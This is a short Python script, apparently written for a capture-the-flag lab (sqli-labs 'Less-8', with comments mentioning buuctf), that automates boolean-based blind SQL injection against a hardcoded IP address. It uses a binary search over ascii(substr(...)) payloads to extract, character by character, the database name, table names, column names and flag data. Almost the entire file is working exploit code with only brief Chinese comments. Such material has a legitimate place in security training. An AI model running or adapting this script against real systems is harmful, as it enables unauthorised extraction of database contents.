import requests as req
import string
import time

url = "http://124.221.18.25:31755/Less-8/?id="
select = "select database()" # 爆破数据库名
#select = "select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()" # 爆破表名
#select = "select(GROUP_CONCAT(column_name))from(information_schema.`COLUMNS`)where(TABLE_name)='Flaaaaag'" #爆破列名
#select="select(GROUP_CONCAT(fl4gawsl))from(Flaaaaag)" #爆破指定列数据

result = ""
for i in range(1,1000): #这里的数字有时候要调整，否则长度超过的就爆破不出来
    low = 32
    high = 127
    mid = (low+high)//2
    while low<high :
        payload = f"1' and ascii(substr(({select}),{i},1))>{mid}%23"
        r = req.get(url=url+payload)
        time.sleep(0.2) #注意 buuctf上的坑 不能发送太快 因此要加这句 【其他平台可以删掉这行】
        if "You are in" in r.text: #这里的 成功 两字要根据情况修改
            low = mid + 1
        else:
            high = mid
        mid =(low+high)//2
    if mid == 32 or mid == 127: #这里实际上只要mid==32就可以 意思是for循环的i只要超过了数据长度 payload中获取的是空字符，最终mid=32
        break
    result +=chr(mid)
    print(result)